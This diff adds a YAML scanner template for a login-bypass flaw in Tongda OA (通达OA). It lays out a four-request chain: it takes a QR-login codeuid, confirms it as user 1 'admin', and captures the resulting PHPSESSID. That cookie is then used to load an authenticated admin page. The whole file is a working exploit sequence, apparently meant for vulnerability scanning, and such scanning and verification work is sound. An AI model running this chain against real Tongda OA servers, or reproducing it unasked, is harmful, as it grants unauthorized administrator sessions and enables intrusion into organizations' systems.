@@ -1,0 +1,34 @@
+name: 通达OA-ispirit-登录绕过2
+description: >-
+  登录绕过
+alwaysExecute: false
+matchCount: 4
+rules:
+  - method: GET
+    path: /ispirit/login_code.php
+    search: '"codeuid":"(?P<uid>[^"]+)"'
+    expression:
+      status: 200
+  - method: POST
+    path: /general/login_code_scan.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded  
+    body: >-
+      codeuid={{uid}}&source=pc&uid=1&type=confirm&username=admin
+    expression:
+      status: 200
+  - method: GET
+    path: /ispirit/login_code_check.php?codeuid={{uid}}
+    search: >-
+      PHPSESSID=(?P<PHPSESSID>[^;]+);
+    expression:
+      status: 200
+  - method: GET
+    path: /general/index.php?is_modify_pwd=1
+    headers:
+      Cookie: PHPSESSID={{PHPSESSID}};
+    expression:
+      status: 200
+      body_all:
+        - "user_id:"
+        - "user_name"
